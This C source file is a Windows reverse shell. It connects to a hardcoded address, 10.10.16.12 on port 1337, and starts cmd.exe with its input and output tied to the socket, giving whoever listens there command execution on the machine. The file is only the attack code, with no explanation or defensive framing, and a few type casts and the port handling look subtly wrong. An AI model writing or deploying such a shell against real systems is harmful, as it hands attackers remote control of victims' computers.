#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")

int main() {

	SOCKET shell_socket;
	WSADATA wsaData;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;

	struct sockaddr_in shell_addr;

	const char ip_addr[] = "10.10.16.12";
	int port = 1337;
	char recv_buffer[512];

	WSAStartup(MAKEWORD(2, 2), &wsaData);

	shell_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	shell_addr.sin_port = port;
	shell_addr.sin_family = AF_INET;
	InetPton(AF_INET, (PCWSTR)ip_addr, &shell_addr.sin_addr.s_addr);

	int connection = WSAConnect(shell_socket, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
	if (connection == SOCKET_ERROR) {
		printf("[!] Failed to connect to target.\n");
		return SOCKET_ERROR;
	}
	else {
		recv(shell_socket, recv_buffer, sizeof(recv_buffer), 0);

		startupInfo.cb = sizeof(startupInfo);
		startupInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)shell_socket;

		CreateProcess(NULL, (LPWSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInformation);
		WaitForSingleObject(processInformation.hProcess, INFINITE);

		CloseHandle(processInformation.hProcess);
		CloseHandle(processInformation.hThread);

		memset(recv_buffer, 0, sizeof(recv_buffer));
	}
}